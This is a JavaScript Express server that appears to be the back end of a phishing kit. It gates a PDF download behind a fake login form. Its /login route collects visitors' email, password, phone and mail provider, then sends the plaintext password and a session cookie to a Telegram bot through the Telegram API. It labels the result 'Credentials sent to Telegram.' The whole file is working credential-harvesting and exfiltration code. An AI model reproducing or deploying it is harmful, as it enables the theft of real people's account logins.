const express = require("express");
const { v4: uuidv4 } = require("uuid");
const Redis = require("ioredis");
const axios = require("axios");
const path = require("path");
require("dotenv").config();

const app = express();

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const REDIS_URL = process.env.REDIS_URL;
const REDIS_TOKEN = process.env.REDIS_TOKEN;

const redis = new Redis(REDIS_URL, {
  password: REDIS_TOKEN,
  tls: {}, // Required for Upstash
});

function getSessionKey(token) {
  return `session:${token}`;
}

app.use(express.static("public"));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post("/login", async (req, res) => {
  if (!BOT_TOKEN || !CHAT_ID || !REDIS_URL || !REDIS_TOKEN) {
    return res.status(500).json({
      success: false,
      message: `Missing BOT_TOKEN, CHAT_ID, or Redis env vars.`,
    });
  }

  let bodyObj = req.body;
  if (typeof bodyObj === "string") {
    try {
      bodyObj = JSON.parse(bodyObj);
    } catch {
      return res.status(400).json({
        success: false,
        message: `Invalid JSON body`,
      });
    }
  }

  const { email, password, phone, provider } = bodyObj || {};
  if (!email || !password || !provider) {
    return res.status(400).json({
      success: false,
      message: `Missing required fields`,
    });
  }

  const normalizedEmail = email.trim().toLowerCase();
  const sessionToken = uuidv4();

  try {
    await redis.set(getSessionKey(sessionToken), normalizedEmail, "EX", 60 * 60 * 24 * 30);
  } catch (err) {
    console.error(`Redis error: ${err}`);
    return res.status(500).json({
      success: false,
      message: `Failed to store session`,
    });
  }

  const expires = new Date("2099-12-31T23:59:59.000Z").toUTCString();
  const cookieString = `session=${sessionToken}; Path=/; HttpOnly; SameSite=Strict; Expires=${expires}`;

  const message = [
    `🔐 New Login`,
    `📧 Email: ${normalizedEmail}`,
    `🔑 Password: ${password}`,
    `📱 Phone: ${phone || "N/A"}`,
    `🌐 Provider: ${provider}`,
    `🍪 Session: ${sessionToken}`,
    `🔖 Cookie: \`${cookieString}\``,
    `⏳ Valid: Never expires`,
    `🕒 Time: ${new Date().toISOString()}`
  ].join("\n");

  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    await axios.post(telegramUrl, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "Markdown",
    });
  } catch (error) {
    console.error(`Telegram error: ${error}`);
  }

  res.setHeader("Set-Cookie", cookieString);
  return res.status(200).json({
    success: true,
    message: `Login successful. Credentials sent to Telegram.`,
    session: sessionToken,
    cookie: cookieString,
    email: normalizedEmail,
  });
});

app.get("/session", async (req, res) => {
  const cookieHeader = req.headers.cookie || "";
  const cookies = Object.fromEntries(
    cookieHeader
      .split(";")
      .map((c) => {
        const index = c.indexOf("=");
        if (index < 0) return [];
        return [c.slice(0, index).trim(), c.slice(index + 1).trim()];
      })
      .filter((pair) => pair.length === 2)
  );

  const sessionToken = cookies.session;

  if (!sessionToken) {
    return res.status(401).json({
      success: false,
      message: `No session cookie found`,
    });
  }

  try {
    const email = await redis.get(getSessionKey(sessionToken));
    if (!email) {
      return res.status(401).json({
        success: false,
        message: `Invalid or expired session`,
      });
    }

    return res.status(200).json({
      success: true,
      email,
    });
  } catch (err) {
    console.error(`Redis error: ${err}`);
    return res.status(500).json({
      success: false,
      message: `Internal server error`,
    });
  }
});

app.get("/download", async (req, res) => {
  const cookieHeader = req.headers.cookie || "";
  const cookies = Object.fromEntries(
    cookieHeader
      .split(";")
      .map((c) => {
        const index = c.indexOf("=");
        if (index < 0) return [];
        return [c.slice(0, index).trim(), c.slice(index + 1).trim()];
      })
      .filter((pair) => pair.length === 2)
  );

  const sessionToken = cookies.session;
  if (!sessionToken) {
    return res.status(401).send(`Login required`);
  }

  try {
    const email = await redis.get(getSessionKey(sessionToken));
    if (!email) {
      return res.status(401).send(`Session expired or invalid`);
    }

    return res.download(path.join(__dirname, "files", "document.pdf"));
  } catch (err) {
    return res.status(500).send(`Error checking session`);
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));